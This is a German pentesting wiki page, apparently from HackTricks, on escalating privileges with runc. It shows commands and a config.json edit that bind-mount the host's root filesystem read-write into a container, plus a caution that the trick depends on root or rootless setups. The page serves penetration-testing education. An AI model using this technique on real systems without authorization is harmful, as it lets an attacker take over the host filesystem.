# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Wenn du mehr über **runc** erfahren möchtest, siehe die folgende Seite:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Wenn du feststellst, dass `runc` auf dem Host installiert ist, kannst du möglicherweise **einen Container starten, der den root-/Ordner des Hosts mountet**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Dies wird nicht immer funktionieren, da die Standardoperation von runc darin besteht, als root ausgeführt zu werden. Daher kann die Ausführung als unprivilegierter Benutzer einfach nicht funktionieren (es sei denn, es ist eine rootless-Konfiguration vorhanden). Eine rootless-Konfiguration zum Standard zu machen, ist generell keine gute Idee, da es innerhalb rootless-Container einige Einschränkungen gibt, die außerhalb rootless-Container nicht gelten.

{{#include ../../banners/hacktricks-training.md}}
